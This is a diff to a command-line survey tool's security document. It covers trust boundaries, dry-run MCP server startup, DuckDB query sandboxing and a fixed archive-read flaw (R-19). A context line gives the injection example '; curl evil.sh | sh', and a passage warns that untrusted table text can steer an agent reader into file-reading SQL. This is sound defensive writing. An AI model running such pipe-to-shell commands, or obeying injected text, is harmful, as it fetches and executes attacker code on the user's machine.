@@ -11,17 +11,19 @@ Audience: anyone running `recon survey` against a config they did not write.
 **Read the config first, then the plan.** `recon survey <mission> --dry-run` validates the
 config and lists every run it would make — the exact substituted shell commands, the URLs,
 the MCP calls and each run's declared effects (network, subprocess, filesystem) — without
-writing anything. It fetches and executes nothing either, with one exception it names in the
-plan's `preflight`: for an `mcp` run it starts the stdio server the config names (and
-connects to a remote one) to list its tools. A config with an `mcp` source therefore runs
-its `command` at the dry run (boundary 8): read that key before planning someone else's
-config. Reviewing a config means reviewing it and that plan.
+writing anything. It fetches, executes and connects to nothing either (ruling R11): planning
+someone else's config is safe. `--dry-run --check` goes further, and says so in the plan's
+`preflight`: for an `mcp` run it starts the stdio server the config names (and connects to a
+remote one) to list its tools, so a config with an `mcp` source runs its `command` at a
+checked dry run (boundary 8): read that key before checking someone else's config. Reviewing
+a config means reviewing it and that plan.
 
 ## Blast radius
 
 A survey may execute arbitrary shell commands, start the MCP servers its config names, make
 outbound HTTP requests carrying your credentials, and write files under the mission directory
-(`.recon/<mission>/`). A dry run may start those MCP servers too.
+(`.recon/<mission>/`). A dry run starts nothing; one with `--check` may start those MCP
+servers too.
 
 ## Trust boundaries
 
@@ -37,6 +39,11 @@ containing `; curl evil.sh | sh` runs. This is not a defect to be fixed by quoti
 whole point of `run:` is to invoke a local tool with operator-chosen arguments, and
 quoting it would break the feature. It is a boundary to be *known*. `--dry-run` prints
 every substituted command, which is the place to read them.
+
+A ranged entry's `{range.start}`, `{range.end}` and `{range.last}` (`range:`, any type) are
+filled before the type sees its settings, with recon's own values: a time in the step's
+format, made of digits and `-:TZ`, never text a source returned. They add nothing a command
+can be steered by.
 
 What constrains it:
 
@@ -173,11 +180,14 @@ has just read the tables — text from the open web, an API, a tool's output. A 
 therefore talk its reader into a query, and DuckDB SQL can read files and load extensions
 that reach the network.
 
-The connection is confined before any SQL runs: `allowed_directories` is the mission's
-`archive/` directory, extension auto-install and auto-load are off, external access is
-off (DuckDB does not allow turning it back on), and the configuration is locked. A query
-reads its own and earlier archives of the same mission and nothing else; `INSTALL`, `LOAD`
-and URLs are refused (R-7). DuckDB lets SQL write wherever it may read, so a query runs only
+The connection is confined before any SQL runs: `allowed_paths` is the files of the tables
+of the archives the query names (its archive, a stream's windows, and the `--baseline`
+archive), extension auto-install and auto-load are off, external access is off (DuckDB does
+not allow turning it back on), and the configuration is locked. A query reads those tables,
+by their names, and nothing else: not another archive of the mission, not the archive's own
+meta, event log, captures or told indexes, and no file outside; `INSTALL`, `LOAD` and URLs
+are refused (R-7). Before 0.17 the sandbox was the mission's whole archive directory, so SQL
+read any archive, and any file in one, by its path (R-19). DuckDB lets SQL write wherever it may read, so a query runs only
 statements DuckDB's parser types as SELECT; `COPY ... TO`, `ATTACH`, `CREATE`, `EXPORT` and
 every other statement are refused before any of the SQL runs (R-10).
 
@@ -190,7 +200,7 @@ is untrusted wherever it is read.
 
 ### 7. Telemetry → the archive's event log, and an OTLP endpoint
 
-Every survey writes its spans to `telemetry.jsonl` in its archive and hands them to
+Every survey keeps its spans in its archive's event log and hands them to
 OpenTelemetry's API, which exports them when an SDK is installed: by the `recon` command
 when the `OTEL_*` variables name an endpoint, or by a program that imports recon. The
 attributes are chosen so that neither destination receives a secret or a body: no header,
@@ -220,13 +230,13 @@ sent.
 An `mcp` source names its server, and each of its two shapes is a boundary of its own.
 
 **A stdio server is a program the config runs.** `command` and `args` are started as a
-child process with your user's rights, at the dry run as at the survey: the same trust as
+child process with your user's rights, at a checked dry run as at the survey: the same trust as
 a `cli` collector's `run:` (boundary 1), and with `npx -y` or `uvx`, a package it downloads
 first. It is not given a shell, and not recon's environment: it gets the SDK's short list
 (`HOME`, `LOGNAME`, `PATH`, `SHELL`, `TERM`, `USER`) and the variables its `env:` gives,
 each written as is or as an `env:NAME` reference the mission declares. Its stderr goes to a
 temporary file; the end of it is quoted in a failed table's error, in `meta.yaml`. It is
-stopped when the survey (or the dry run) ends, however it ends. It runs in the project
+stopped when the survey (or the checked dry run) ends, however it ends. It runs in the project
 root, not recon's working directory, so a server given `.` reads the same tree wherever
 recon is run from.
 
@@ -284,11 +294,16 @@ calls: a failed one carries the tool's error text as its status. The MCP SDK's s
 method name and a request id) nest under recon's when an SDK is installed; a JSON-RPC error
 the server sends can be their status message.
 
-### 9. A cursor → the archive store (`recon watch`, `recon.read_since`)
+### 9. A cursor, an archive's id → the archive adapter (`recon watch`, `recon.read_since`, `--archive`)
+
+Every archive is named by reference (its mission, its stream, its id), never by where it is,
+and the reference is input from the caller: the file adapter refuses an id that is not an
+archive's or a window's, a stream name that is not one name of its own (`..`, `/`, a leading
+`.`) and a mission name that is not one, as `usage` errors, before it makes a path of any.
 
 A read of an archive being written takes back the `cursor` an earlier read gave, so the
 cursor is input from the caller, and may be anything. It is base64url JSON that only the
-archive store reads: one that does not decode, names another archive, holds an offset that
+archive adapter reads: one that does not decode, names another archive, holds an offset that
 is not a non-negative integer, or reaches past the end of a sealed table is refused as a `usage`
 error, and the read returns nothing. A table the cursor names is only compared with the tables
 the store finds in the archive, never made into a path, so a cursor cannot make recon read
@@ -656,8 +671,8 @@ Regression: `recon/tests/test_credentials.py`,
 
 ### R-17 — a record's content could be recovered from its hash (prevented, change detection)
 
-Change detection keeps a hash of each record's content in a table's key index
-(`<output>.keys.jsonl`), which SQL can read. A plain hash of content with few possible values
+Change detection keeps a hash of each record's content in a table's told index, which SQL
+could read until 0.17 (R-19). A plain hash of content with few possible values
 (a one-time code in a mail subject: a million) is recovered by hashing every guess (vector,
 round 4). The hash is a keyed BLAKE2b under the mission's own key, `.recon/<mission>/
 changes.key`, random, mode 0600 and never written anywhere else, so without that file a guess
@@ -678,6 +693,19 @@ Regression: `recon/tests/test_changes.py`, `recon/tests/test_changes_property.py
 A record's text is a stranger's. A lone surrogate (JSON `"\ud800"`) cannot be encoded as UTF-8, and change detection's hash, and its DuckDB join's files, encoded it so: one mail subject made every tick's survey end without finishing its archive (Vector F6). The hash now passes a surrogate through as its code point's bytes, the DuckDB join holds keys as the hex of their bytes, and any other failure of the change phase is that table's (`changes.error`, a `changes_failed` warning), never its survey's.
 
 Regression: `recon/tests/test_changes.py::TestHostileContent`.
+
+### R-19 — a query could read any archive of its mission, and any file in one (fixed, 0.17.0)
+
+The sandbox of boundary 6 was the mission's archive directory, so SQL read any archive of the
+mission by its path (the skill taught `read_json_auto('.recon/<mission>/archive/<id>/...')`
+for the diff across archives), and any file in one: its meta, event log, captures and told
+indexes, which are no table. The layout was a contract an agent learned, and the told index's
+hashes were open to SQL. Fixed: a query names its archives by id (`--archive`, `--baseline`),
+and the connection's `allowed_paths` is the files of those archives' tables alone, so a path in
+SQL is refused whatever it names, and the archive's other files are recon's.
+
+Regression: `recon/tests/test_query.py::TestConfinement`,
+`recon/tests/test_skill.py::test_the_skill_teaches_no_archive_file_path`.
 
 ## Not covered
 
